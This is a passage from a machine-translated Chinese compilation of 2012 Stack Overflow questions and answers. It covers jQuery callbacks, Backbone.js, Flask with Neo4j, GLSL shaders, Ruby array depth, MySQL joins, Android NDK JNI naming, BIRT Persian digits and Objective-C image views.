fadeEasing: ""
fadeSpeed: 350
generateNextPrev: false
generatePagination: true
hoverPause: false
next: "next"
pagination: true
paginationClass: "pagination"
pause: 0
play: 7200
preload: false
preloadImage: "/img/loading.gif"
prependPagination: false
prev: "prev"
randomize: false
slideEasing: ""
slideSpeed: 350
slidesLoaded: function (){}
start: 1
__proto__: Object
] 
```

而不是实际的`$('#my_slideshow')`对象，我似乎无法获得参考。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:13:33.513

我认为

```
$(this).something(); 
```

你可以在很少的搜索中找到这些问题的答案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:20:33.683

是`$(this)`的，用于 jQuery 对象或`this`普通 DOM 节点：

```
$('#my_slideshow').slides({
    animationStart: function() {
        var callingElement = $(this), // jQuery object,
            callingElementDOMNode = this; // DOM node
            // hence:
        $(this).something();
        }
    }); 
```

另外，作为附录，请注意我已经在初始括号中关闭了选择器的字符串。

# c# - 正则表达式翻译器

> ID：10862185
> 
> 赞同：0
> 
> 时间：2012-06-02T12:06:46.487
> 
> 标签：c#, regex

> **可能重复：**
> [什么是最好的正则表达式生成器/解释器](https://stackoverflow.com/questions/7883415/what-is-the-best-regular-expression-generator-explainer)

有没有办法从正则表达式变成它的意思？例如，我在旧代码中找到了以下表达式：

```
.*[^a-zA-Z0-9_].* 
```

...但我不知道这是否 100% 正确或是否包含任何不必要的字符？有没有做正则表达式翻译的在线工具？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:12:22.553

我使用[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)。您可以输入正则表达式和要应用它的文本。它还包含几个样本。

# javascript - 主干js，绑定模型到视图

> ID：10862187
> 
> 赞同：2
> 
> 时间：2012-06-02T12:06:56.653
> 
> 标签：javascript, backbone.js

我正在尝试backbonejs，但被困在如何将模型绑定到视图上。

```
yepnope({
    load : ["/static/js/lib/jquery-1.6.2.min.js", "/static/js/lib/underscore-min.js", "/static/js/lib/backbone-min.js"],
    complete: nameList
});

function nameList() { 
    var PageItem = Backbone.Model.extend({
                                    defaults: {name: "default name" }
    }); 
    var Page = Backbone.Collection.extend({
        model: PageItem 
    });     
    var page = new Page;

    var AppView = Backbone.View.extend({
        el: $("#names"),
        $artistList: $('#names_list'),
        $inputField: $('input#new_name'),
        events: { 
            "keypress input": "processKeyPress" 
        },
        processKeyPress: function(event){
            if(event.charCode == 13) {
                event.preventDefault();
                this.addName();   
             }   
        }, 
        addName: function(event) {
                   var newName = this.$inputField.val(); 
                   this.$artistList.prepend('<li>' + newName + '</li>');
                   page.push(new  PageItem({name: newName})); 
                   // I've also tried page.push({name: newName});                                                                                                                                                  
    }       }); 
    var app = new AppView;} 
```

当我在输入字段上按 Enter 键时，它运行调用 addName 的 processKeyPress，新名称被添加到 html 列表中，但不会推送到模型上。我不断得到：

```
Uncaught TypeError: Object function (a){return new l(a)} has no method 'isObject' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T13:52:26.733

好的，请自己测试一下，但它似乎与 Github 版本的下划线一起工作，所以也许有一个错误已被修复.. [http://jsfiddle.net/yjZVd/6/](http://jsfiddle.net/yjZVd/6/)

# python - 使用 Python Neo4j-Embedded 的最小烧瓶示例

> ID：10862188
> 
> 赞同：3
> 
> 时间：2012-06-02T12:07:09.243
> 
> 标签：python, flask, neo4j

我无法通过嵌入式 python 绑定（neo4j / python-embedded，版本 1.6）使用 neo4j 图形数据库使用 Python Micro-Webframework Flask 实现一个工作的最小示例。我所拥有的（基于这个 Stack-Overflow- [thread](https://stackoverflow.com/questions/7999532/how-do-i-use-neo4j-embedded-for-python-threads-in-flask-microframework)）是：

```
import os
import jpype
from neo4j import GraphDatabase
from flask import Flask, g

# configuration
DATABASE = 'graphdatabase'
DEBUG = True
SECRET_KEY = 'blubber'
USERNAME = 'tobias'
PASSWORD = 'bla'
ADMIN = 'admin'

app = Flask(__name__)
app.config.from_object(__name__)

def connectDB(): 
    return GraphDatabase(app.config['DATABASE'])

def initDB():
    db = connectDB()
    with db.transaction:
        users = db.node()
        userIndex = db.node.indexes.create('users')
        user = db.node(name=app.config['ADMIN'])
        userIndex['name'][app.config['ADMIN']] = user
    db.shutdown()
    print "Database initialized."

@app.before_request
def before_request():
    jpype.attachThreadToJVM()
    g.db = connectDB()

@app.teardown_request
def teardown_request(exception):
    jpype.attachThreadToJVM()
    g.db.shutdown()

@app.route('/')
def index():
    with g.db.transaction:
          userIndex = g.db.node.indexes.get('users')
          user = userIndex['name'][app.config['ADMIN']].single
          username = user['name']
    return render_template('index.html', name=username)

if os.path.exists(app.config['DATABASE']) == False:
    initDB()

if __name__ == '__main__':
  app.run() 
```

不幸的是，它抛出：

```
 File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1518, in __call__
return self.wsgi_app(environ, start_response)
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1506, in wsgi_app
response = self.make_response(self.handle_exception(e))
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1504, in wsgi_app
response = self.full_dispatch_request()
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1264, in full_dispatch_request
rv = self.handle_user_exception(e)
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1262, in full_dispatch_request
rv = self.dispatch_request()
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/flask/app.py", line 1248, in dispatch_request
return self.view_functions[rule.endpoint](**req.view_args)
File "/home/tobias/Esk/Dev/adhocracyLight/adhocracyLight.py", line 73, in index
userIndex = g.db.node.indexes.get('users')
File "/home/tobias/Esk/Dev/adhocracyLight/venv/lib/python2.7/site-packages/neo4j/index.py", line 36, in get
return self._index.forNodes(name)
java.lang.RuntimeExceptionPyRaisable: java.lang.IllegalArgumentException: No index provider 'lucene' found. Maybe the intended provider (or one more of its dependencies) aren't on the classpath or it failed to load. 
```

我猜这个问题是由于线程（`g`是线程本地的并且包含指向neo4j-Database的指针，也许这是一个坏主意？）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T17:39:41.127

Neo4j Embedded 不打算在 Web 服务器环境中使用——您应该使用 Neo4j Server 和 Neo4j Server 客户端。

Bulbs ( [http://bulbflow.com](http://bulbflow.com) ) 是一个 Neo4j 服务器客户端，在设计时考虑了 Flask，实际上，bulbflow.com 使用 Neo4j Heroku Add On（目前是免费的）在 Heroku 上的 Flask 上运行。

您使用 Gremlin 或 Cypher 进行查询和交易请求。

有关如何构建应用程序的示例，请参阅 Lightbulb ( [https://github.com/espeed/lightbulb](https://github.com/espeed/lightbulb) ) 博客示例，尤其是：

*   [https://github.com/espeed/lightbulb/blob/master/lightbulb/model.py](https://github.com/espeed/lightbulb/blob/master/lightbulb/model.py)
*   [https://github.com/espeed/lightbulb/blob/master/lightbulb/bulbsconf.py](https://github.com/espeed/lightbulb/blob/master/lightbulb/bulbsconf.py)

注意bulbsconf.py 中的这一行：

```
bulbs_config.set_neo4j_heroku() 
```

Lightbulb 旨在通过 Neo4j Heroku Add On 在 Heroku 上运行——如果您不在 Heroku 上运行，请忽略该行。

然后在您的 Flask 视图或您的 app.py 中，执行以下操作：

```
from bulbsconf import graph 
```

# extjs - extjs：标签容器宽度

> ID：10862189
> 
> 赞同：0
> 
> 时间：2012-06-02T12:07:18.567
> 
> 标签：extjs, tabs

我正在自学 extjs，并且正在使用标签。我不知道如何调整整个容器的大小，不仅仅是选项卡，还有每个选项卡的数据将显示在哪里......我试过 width: 400 但没有改变

到目前为止，这是我的代码：

```
Ext.application({
    name: 'HelloExt',
    launch: function() {

    Ext.require('Ext.container.Viewport');

    Ext.create('Ext.container.Viewport', {
        layout: 'fit',
        items: [{

            xtype: 'tabpanel',
            width: 400,
            activeTab: 0, // index or id
            items:[{
                title: 'Tab 1',
                html: 'This is tab 1 content.'
            },{
                title: 'Tab 2',
                html: 'This is tab 2 content.'
            },{
                title: 'Tab 3',
                html: 'This is tab 3 content.'
            }]

        }]//end of viewport
    });
}
}); 
```

有人可以给我一个片段吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T10:35:20.043

您使用布局：“适合”，因此选项卡面板无法获取宽度属性尝试布局：“表单”

# c# - 当出现蓝屏错误时，有什么方法可以获取事件？

> ID：10862191
> 
> 赞同：2
> 
> 时间：2012-06-02T12:07:29.633
> 
> 标签：c#

我知道电脑会在几秒钟后自动重启（取决于配置）。

然而，有没有办法在蓝屏事件发生时得到它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T15:47:21.873

这不可能像人们所说的那样，

您仍然可以使用这些程序来分析您的蓝屏死机

*   [谁崩溃了](http://www.resplendence.com/whocrashed)
*   [蓝屏视图](http://www.nirsoft.net/utils/blue_screen_view.html)

# ios - 使用着色器着色

> ID：10862192
> 
> 赞同：0
> 
> 时间：2012-06-02T12:07:33.703
> 
> 标签：ios, opengl-es, opengl-es-2.0

我在 XCode OpenGL ES 模板之上创建了一个项目。

有没有办法为每个对象自定义着色器颜色？

着色器.vsh：

```
attribute vec4 position;
attribute vec3 normal;

varying lowp vec4 colorVarying;

uniform mat4 modelViewProjectionMatrix;
uniform mat3 normalMatrix;

void main()
{
    vec3 eyeNormal = normalize(normalMatrix * normal);
    vec3 lightPosition = vec3(1.0, 1.0, 1.0);
    vec4 diffuseColor = vec4(1, 0.4, 1.0, 1.0);

    float nDotVP = max(0.0, dot(eyeNormal, normalize(lightPosition)));

    colorVarying = diffuseColor * nDotVP;

    gl_Position = modelViewProjectionMatrix * position;
} 
```

着色器.fsh：

```
varying lowp vec4 colorVarying;

void main()
{
    gl_FragColor = colorVarying;
} 
```

我是否需要创建一个额外的属性`Shader.vsh`来解析颜色以替换`diffuse`变量，或者这是如何完成的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:54:35.720

我建议对颜色使用统一变量

```
// put this in Shader.vsh, before the main()
uniform vec4 diffuseColor; 
```

并在代码中设置值：

```
glUseProgram(progID);

// object 1 (R, G, B, A is a color)
glUniform4f(glGetUniformLocation(progID, "diffuseColor"), R, G, B, A);
draw_object_1();

// object 2 (R, G, B, A is a color)
glUniform4f(glGetUniformLocation(progID, "diffuseColor"), R, G, B, A);
draw_object_2(); 
```

光的位置也可以这样做。

# javascript - 如何在 Google Maps API 中将 Class 或 ID 添加到 Overlay

> ID：10862193
> 
> 赞同：0
> 
> 时间：2012-06-02T12:07:34.333
> 
> 标签：javascript, google-maps

如何在 Google Maps API 中将类或 ID 添加到叠加层？例子：

```
subOverlay.prototype.onAdd = function() {
    var div = document.createElement('DIV');
    div.addClass="map_marker";   // I try
    this.div_ = div;
    var panes = this.getPanes();
    panes.overlayImage.appendChild(div);
} 
```

但不工作:(请帮助我

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:10:28.773

你有错误的财产。它是[`className`](https://developer.mozilla.org/en/DOM/element.className)，不是`addClass`：

```
div.className = "map_marker"; 
```

您可能一直在考虑 jQuery 方法，`addClass`在这种情况下，您需要调用该方法，而不是分配给它。

# ruby - Ruby：如何知道多维数组的深度

> ID：10862197
> 
> 赞同：3
> 
> 时间：2012-06-02T12:08:13.630
> 
> 标签：ruby, arrays, multidimensional-array

这是我在作业中遇到的问题。

*   数组 A 有两个元素：数组 B 和数组 C。
*   数组 B 有两个元素：数组 D 和数组 E
*   在某些时候，数组 X 只包含两个元素：字符串 a 和字符串 b。

我不知道如何确定数组 A 的深度。例如：

```
arrA = [
         [
           [1,2]
         ]
       ] 
```

我已经测试过：`A[0][0][0] == nil`which 返回`false`. 而且，`A[0][0]..[0] == nil`总是返回`false`。所以，我无法通过这种方式知道数组 A 的深度。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-02T15:15:51.887

如果这不是你要找的，它应该是一个很好的起点：

```
def depth (a)
  return 0 unless a.is_a?(Array)
  return 1 + depth(a[0])
end

> depth(arrA)
=> 3 
```

请注意，这仅测量第一个分支的深度。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-02T15:33:48.810

我下面的解决方案回答了任何数组的最大深度：

示例：对于 arr= **[** [[1],[2,3]], **[[[** 3,4 ]]] ]，对于 3,4，arr 的最大深度为**4**。

Aprroach - 变平一层并进行比较

```
b, depth = arr.dup, 1

until b==arr.flatten
  depth+=1
  b=b.flatten(1)
end
puts "Array depth: #{depth}" #=> 4 
```

希望它能回答你的问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-04-10T17:40:38.227

一个简单的纯函数递归解决方案：

```
def depth(xs, n=0)
  return case
  when xs.class != Array
    n
  when xs == []
    n + 1
  else
    xs.collect{|x| depth x, n+1}.max
  end
end 
```

例子：

```
depth([]) == 1
depth([['a']])) == 2
depth([1, 2, 3, 4, [1, 2, 3, [[2, 2],[]], 4, 5, 6, 7], 5, 5, [[[[[3, 4]]]]], [[[[[[[[[1, 2]]]]]]]]]]) == 10 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-09-22T06:24:15.440

如果您想使用，还有一行代码

```
 def depth (a)
        a.to_s.count("[")
    end 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-07T15:42:06.820

这是一个类似于[Kiddorails 解决方案](https://stackoverflow.com/a/10863610/2771889)的单行代码，提取到方法中：

```
def depth(array)
  array.to_a == array.flatten(1) ? 1 : depth(array.flatten(1)) + 1
end 
```

它会在计算维度的同时将数组 1 维展平，直到它不能再展平。

为什么这比其他解决方案更好？

*   不需要修改本机类（如果可能，请避免）
*   不使用元编程（`is_a?`, `send`,`respond_to?`等）
*   相当容易阅读
*   也适用于哈希（注意`array.to_a`）
*   *确实有效（不像只检查第一个分支和其他愚蠢的东西）*

# asp.net - 为特定页面启用无超时

> ID：10862198
> 
> 赞同：0
> 
> 时间：2012-06-02T12:08:21.550
> 
> 标签：asp.net, asp.net-3.5, asp.net-2.0, request-timed-out

我有一个页面在做某事，它可能需要 1,2 小时甚至更长时间......一段时间后我收到请求超时，我希望这个特定页面不会被请求超时 - 永远（或至少 24 小时）。

我该怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:28:32.853

您可以创建一个带有信号的线程，以了解它是否仍在运行。我建议使用互斥信号，因为它是唯一可以在许多池和线程中相同的信号。

线程代码可以是：

```
public class RunThreadProcess
{
    // Some parametres
    public int cProductID;

    // my thread
    private Thread t = null;

    // start it
    public Thread Start()
    {
        t = new Thread(new ThreadStart(this.work));
        t.IsBackground = true;
        t.SetApartmentState(ApartmentState.MTA);
        t.Start();

        return t;
    }

    // actually work
    private void work()
    {
        // while the mutex is locked, the thread is still working
        Mutex mut = new Mutex("WorkA");
        try
        {
            mut.WaitOne();

            // do thread work
            all parametres are available here

        }
        finally
        {
          mut.ReleaseMutex();
        }
    }
} 
```

你称它为

```
 Mutex mut = new Mutex("WorkA");

 try
 {
 if(mut.WaitOne(1000))
 {
   // release it here to start it from the thread as signal
   mut.ReleaseMutex();
   // you start the thread
   var OneAction = new RunThreadProcess();

    OneAction.cProductID = 100;
    OneAction.Start();
  }
  else
  {
     // still running
  }
 }
 finally
 {
   mut.ReleaseMutex();
 } 
```

# mysql - 如何连接多个表，包括查找表并按行返回数据

> ID：10862201
> 
> 赞同：5
> 
> 时间：2012-06-02T12:08:46.333
> 
> 标签：mysql, sql, pivot-table, lookup-tables, jointable

我正在尝试显示一些简单的计算机游戏结果，并使其易于在我的代码中逐行遍历结果。我想要它，以便每场比赛的所有相关数据都在每条记录中，这样我就可以在一行上输出所有数据，例如：

*   **A队**（**45**分）vs **B队**（**55**分），比赛时长：**5**分钟
*   **C队**（**60**分）vs **D队**（**65**分），比赛时长：**4.3**分钟

因此，对于一场比赛，有两支球队互相比赛，他们各自在比赛结束时得分。基本上，每场比赛的 games_teams 表中最终都会有两行。

这是我的架构：

![架构图片](../Images/585a5974fcc33d998f372816ba175fb1.png)

这是我的表格数据：

![表格数据图片](../Images/39ebfca22b84b7624daa8efdd854dd6b.png)

这是我想要实现的输出，因此我可以轻松地遍历结果并将它们输出到页面上：

![所需的输出图片](../Images/b33b79d55aae8a390c481d59e0699e53.png)

我设法通过一些可怕的 SQL 和许多子查询来实现这一点，如下所示：

```
SELECT games.game_id, game_name, game_duration, 
(SELECT team_id FROM games_teams WHERE games.game_id = games_teams.game_id LIMIT 0, 1) AS team_id_a,
(SELECT team_id FROM games_teams WHERE games.game_id = games_teams.game_id LIMIT 1, 1) AS team_id_b,
(SELECT teams.team_name FROM games_teams INNER JOIN teams ON games_teams.team_id = teams.team_id WHERE games.game_id = game_id LIMIT 0, 1) AS team_name_a,
(SELECT teams.team_name FROM games_teams INNER JOIN teams ON games_teams.team_id = teams.team_id WHERE games.game_id = game_id LIMIT 1, 1) AS team_name_b,
(SELECT team_score FROM games_teams WHERE games.game_id = games_teams.game_id LIMIT 0, 1) AS team_score_a,
(SELECT team_score FROM games_teams WHERE games.game_id = games_teams.game_id LIMIT 1, 1) AS team_score_b
FROM games 
```

该方法的问题是它会很慢并且无法扩展。我还需要从 games_teams 表中提取其他游戏统计信息，这样就会有更多的子查询。

我尝试的另一种方法是：

![不需要的输出图片](../Images/d13159ed995869c557ce0e0631b383f4.png)

我通过以下 SQL 实现了这一点：

```
SELECT games.game_id, game_name, game_duration, teams.team_id, team_name, team_score
FROM games
INNER JOIN games_teams ON games.game_id = games_teams.game_id
INNER JOIN teams ON games_teams.team_id = teams.team_id 
```

现在这种方式将更难在代码中遍历，因为每个游戏的相关数据都在两个不同的记录中。我必须构建该行的第一部分，然后进入下一个循环迭代并打印下一部分。然后为下一场比赛重新开始，我试图在一行上显示所有信息，例如：

A队（45分）vs B队（55分），比赛时间：5分钟

所以这就是为什么我认为如果全部都在一张唱片上会更容易。有没有办法很好地完成这一点，所以如果我需要 games_teams 表中的更多列，它也可以扩展？

如果您需要重新创建它，[这是一个包含数据库代码的 pastebin 链接。](http://pastebin.com/GDd6u5jf)

非常感谢任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T12:53:29.183

您需要加入 games_teams 和团队两次，例如：

```
SELECT ga.game_id
        , ga.game_name
        , ga.game_duration
        , t1.team_name, gt1.team_score
        , t2.team_name, gt2.team_score
FROM games ga
JOIN games_teams  gt1 ON gt1.game_id = ga.game_id
JOIN games_teams  gt2 ON gt2.game_id = ga.game_id
JOIN teams t1 ON t1.team_id = gt1.team_id
JOIN teams t2 ON t2.team_id = gt2.team_id
WHERE gt1.team_id < gt2.team_id
        ; 
```

挤出 {games_teams * teams} 子连接并引用它两次的干净方法是将其放入 CTE 中：（不幸的是 mysql 不支持 CTE）

```
WITH gtx AS (
        SELECT gt.game_id
        , gt.team_score
        , te.team_id
        , te.team_name
        FROM games_teams gt
        JOIN teams te ON te.team_id = gt.team_id
        )
SELECT ga.game_id 
        , ga.game_name
        , ga.game_duration
        , g1.team_name, g1.team_score
        , g2.team_name, g2.team_score
FROM games ga
JOIN gtx g1 ON g1.game_id = ga.game_id
JOIN gtx g2 ON g2.game_id = ga.game_id
WHERE g1.team_id < g2.team_id
  ; 
```

结果：

```
 game_id | game_name | game_duration | team_name | team_score | team_name | team_score 
---------+-----------+---------------+-----------+------------+-----------+------------
       1 | Game A    |           300 | Team A    |         45 | Team B    |         55
       2 | Game B    |           258 | Team C    |         60 | Team D    |         65
(2 rows) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:43:01.187

由于每场比赛总是有两支球队，因此您可以使用 UNION 来获取每场比赛的球队，这简化了这一点，如下所示：

```
SELECT q2.game_id, games.game_name, games.game_duration,
       q2.team_id_a, q2.team_id_b,
       teams_a.team_name AS team_name_a,
       teams_b.team_name AS team_name_b,
       games_teams_a.team_score AS team_score_a,
       games_teams_b.team_score AS team_score_b
FROM  (SELECT q.game_id,
              MAX(q.team_id_a) AS team_id_a,
              MAX(q.team_id_b) AS team_id_b
          FROM (
               SELECT games_teams.game_id,
                      MIN(games_teams.team_id) AS team_id_a,
                      0 AS team_id_b
               FROM   games_teams
               GROUP BY games_teams.game_id
            UNION
               SELECT games_teams.game_id,
                      0 AS team_id_a,
                      MAX(games_teams.team_id) AS team_id_b
               FROM   games_teams
               GROUP BY games_teams.game_id
         ) q
        GROUP BY q.game_id) q2
   INNER JOIN games ON q2.game_id = games.game_id
   INNER JOIN teams teams_a ON q2.team_id_a = teams_a.team_id
   INNER JOIN teams teams_b ON q2.team_id_b = teams_b.team_id
   INNER JOIN games_teams games_teams_a ON
              q2.game_id = games_teams_a.game_id AND q2.team_id_a = games_teams_a.team_id
   INNER JOIN games_teams games_teams_b ON
              q2.game_id = games_teams_b.game_id AND q2.team_id_b = games_teams_b.team_id; 
```

# android - Android-NDK“java.lang.UnsatisfiedLinkError”

> ID：10862208
> 
> 赞同：2
> 
> 时间：2012-06-02T12:09:50.270
> 
> 标签：android, android-ndk

我是 NDK 以及 c、c++ 的新手。所以如果我错了，请原谅我。

我得到的 Log cat 中的错误是`java.lang.UnsatisfiedLinkError` 在 ndk-build 之后我可以看到`libfirst-opengl.so`lib 文件夹中的库

听到是我的 JAVA 代码

```
public class MainActivity extends Activity {
    private GLSurfaceView mGLSurfaceView;

    /** Called when the activity is first created. */
    static{
        System.loadLibrary("first-opengl");
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Set window full screen and remove title bar
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // Create the EGL surface (set OpenGL version 2.0) and override the
        // renderer with our custom one
        mGLSurfaceView = new GLSurfaceView(this);
        mGLSurfaceView.setEGLContextClientVersion(2);
        mGLSurfaceView.setRenderer(new MySurfaceViewRenderer());
        setContentView(mGLSurfaceView);
    }

    @Override
    public void onPause() {
        super.onPause();
        mGLSurfaceView.onPause();
    }

    @Override
    public void onResume() {
        super.onResume();
        mGLSurfaceView.onResume();
    }

    public class MySurfaceViewRenderer implements Renderer {

        public void onSurfaceCreated(GL10 unused, EGLConfig config) {
            JNIOnSurfaceCreated();
        }

        public void onSurfaceChanged(GL10 unused, int w, int h) {
            JNIOnSurfaceChanged(w, h);
        }

        public void onDrawFrame(GL10 unused) {
            JNIOnDrawFrame();
        }

        private native void JNIOnSurfaceCreated();

        private native void JNIOnSurfaceChanged(int w, int h);

        private native void JNIOnDrawFrame();
    }

} 
```

C++ 文件的代码是..

```
#include <jni.h>
#include <string.h>
#include <GLES2/gl2.h>
#include <GLES2/gl2ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <android/log.h>

#define  LOG_TAG    "opengl-first"
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

void surfaceCreated(){
    const GLubyte* puiOpenGLVersion = glGetString(GL_VERSION);
    LOGI("OpenGL Version: \"%s\"\n", (char*)puiOpenGLVersion);

}

void surfaceChanged(int w, int h){

    LOGI("JNIOnSurfaceChanged %dx%d\n", w, h);
    glViewport(0, 0, w, h);
}

void drawFrame(){
     // Clear the screen to a random shade of grey
        float fColor = (float)(rand() % 256) / 255.0f;
        glClearColor(fColor, fColor, fColor, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);
}

extern "C" {
    JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnDrawFrame(JNIEnv* env, void* reserved);
    JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnSurfaceChanged(JNIEnv* env, void* reserved, int w, int h);
    JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnSurfaceCreated(JNIEnv* env, void* reserved);
};

JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnSurfaceCreated(JNIEnv* env, void* reserved)
{
    surfaceCreated();
}

JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnSurfaceChanged(JNIEnv* env, void* reserved, int w, int h)
{
    surfaceChanged(w,h);
}

JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnDrawFrame(JNIEnv* env, void* reserved)
{
    drawFrame();
} 
```

和我的制作文件：-

```
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)
LOCAL_LDLIBS    := -llog -lGLESv2
LOCAL_CFLAGS    := -Werror
LOCAL_MODULE    := first-opengl
LOCAL_SRC_FILES := opengl-first.cpp

include $(BUILD_SHARED_LIBRARY) 
```

我不知道产生错误的部分，所以我添加了所有代码

请帮帮我。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-03T00:08:50.290

您的本机函数位于 MySurfaceViewRenderer 渲染器类中，而不是 MainActivity，因此：

```
JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_JNIOnDrawFrame 
```

应该是：

```
JNIEXPORT void JNICALL Java_com_nix_opendk_MainActivity_MySurfaceViewRenderer_JNIOnDrawFrame 
```

我没有尝试访问 jni 中的内部类，但这似乎基于规范。

# birt - Birt Report 将数字转换为波斯数字

> ID：10862211
> 
> 赞同：1
> 
> 时间：2012-06-02T12:10:26.143
> 
> 标签：birt, persian

我正在将 Birt 与 Eclipse Indigo 一起使用。

我在报告中使用了一个表格。该表将从数据集中获取值。我想将数字转换为波斯数字。我尝试使用 java 脚本，但它不起作用。

```
var number = dataSetRow["invoice-number"];
var farsiNumber=new Array();
farsiNumber[0]='\u06f0';
farsiNumber[1]='\u06f1';
farsiNumber[2]='\u06f2';
farsiNumber[3]='\u06f3';
farsiNumber[4]='\u06f4';
farsiNumber[5]='\u06f5';
farsiNumber[6]='\u06f6';
farsiNumber[7]='\u06f7';
farsiNumber[8]='\u06f8';
farsiNumber[9]='\u06f9';
var outputNumber = "";
for(var i=0;i<number.length;i++) {
var ch = number.charAt(i);
var index = farsiNumber[ch];
if(ch >= 0 && ch <= 9)
outputNumber = outputNumber+index;
else
outputNumber = outputNumber+ch;
}
this.data = outputNumber; 
```

有没有其他方法可以做到这一点，或者我应该为 Birt Functions 插件创建一个插件来做到这一点。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-05T23:27:46.980

使用此`JavaScript`函数将数字转换为波斯语：

```
function toPersianNumber(num){
  var persianNumberArray = new Array('۰','۱','۲','۳','۴','۵','۶','۷','۸','۹')
  var res = ''
  while(num/10 > 0){
    n = num%10
    num = parseInt(num/10)
    res = persianNumberArray[n] + res
  }
  return res
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-09T09:43:59.710

我正在使用此功能以获得更好的性能:)

函数 toPersianChar(str) { var map = ["\u0660","\u0661","\u0662","\u0663","\u0664", "\u0665","\u0666","\u0667", "\u0668","\u0669"] var replaceDigits = str.replace(/\d(?=[^<>]*(<|$))/g, function($0) { return map[$0]}) ;

```
return(replaceDigits);
}; 
```

# objective-c - 将图像从数组显示到 uiimageview

> ID：10862213
> 
> 赞同：0
> 
> 时间：2012-06-02T12:10:30.333
> 
> 标签：objective-c, image, uiimageview, nsmutablearray, imageview

> **可能重复：**
> [访问数组对象](https://stackoverflow.com/questions/10864893/access-to-array-object)

我的 xib 文件中有一个包含图像和图像视图的数组。现在，我想在我的图像视图中查看我的数组包含的第一个对象（图像）。我试着做了几个小时，但我没有成功。我该怎么做？？

mt数组减速：

```
 photoArray = [[NSMutableArray alloc] init];
    PhotoItem *photo1 = [[PhotoItem alloc] initWithPhoto:[UIImage imageNamed:@"1.jpg"] name:@"roy rest"  photographer:@"roy"];
    PhotoItem *photo2 = [[PhotoItem alloc] initWithPhoto:[UIImage imageNamed:@"2.jpg"] name:@"roy's hand" photographer:@"roy"];
    PhotoItem *photo3 = [[PhotoItem alloc] initWithPhoto:[UIImage imageNamed:@"3.jpg"] name:@"sapir first" photographer:@"sapir"];
    PhotoItem *photo4 = [[PhotoItem alloc] initWithPhoto:[UIImage imageNamed:@"4.jpg"] name:@"sapir second" photographer:@"sapir"];
    [photoArray addObject:photo1];
    [photoArray addObject:photo2];
    [photoArray addObject:photo3];
    [photoArray addObject:photo4]; 
```

我尝试使用的代码：

```
imgView = [[UIImageView alloc] initWithImage:[photoArray objectAtIndex:0]]; 
```

谢谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-24T23:36:24.390

您的问题的答案非常简单，如果您不熟悉这一切，请尝试分步进行。

```
array: photoarray 
imageView in xib : imgView
imgView =[UIImageView alloc]init];
imgView.image=[UIImage imageNamed:[photoarray objectatindex:0]]; 
```

这将满足您的问题的目的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:27:55.583

您的照片数组不包含图像，它包含自定义 PhotoItem 对象。您需要从该对象中获取 UIImage 。我假设您有一个属性集，可能名为 photo on `PhotoItem`。你需要打电话给这个。

```
imgView = [[UIImageView alloc] initWithImage:[[photoArray objectAtIndex:0] photo]];

// or

imgView = [[UIImageView alloc] initWithImage:[photoArray objectAtIndex:0].photo]; 
```

**更新**

您必须具有属性才能访问有关对象的信息。您需要重建您的 PhotoItem 类，以便为您想要访问的内容（如照片、姓名和摄影师）提供属性。无法以您尝试的方式访问实例变量。

```
// PhotoItem.m

@interface PhotoItem : NSObject
{
     // Instance Variables aren't accessible outside of the class.
}

@property (nonatomic, strong) UIImage *photo;
@property (nonatomic, strong) NSString *name;
@property (nonatomic, strong) NSString *photographer;

